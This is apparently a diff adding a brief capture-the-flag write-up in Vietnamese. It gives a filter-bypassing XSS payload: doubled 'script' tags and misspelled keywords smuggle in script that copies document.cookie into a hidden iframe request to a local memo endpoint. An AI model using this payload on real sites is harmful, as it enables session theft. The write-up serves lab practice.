@@ -1,0 +1,10 @@
+DH{**flag**}
+
+
+hướng bypass như các bài xss
+tuy nhiên chúng ta phải để ý hàm filter nhé
+
+<iframe id="myIframe" style="display:noonne;"></iframe> 
+<scrscriptipt>
+    document.getElementById("myIframe").src = "http://127.0.0.1:8000/memo?memo=" + encodeURICompoonnent(document.cookie); 
+</scrscriptipt>
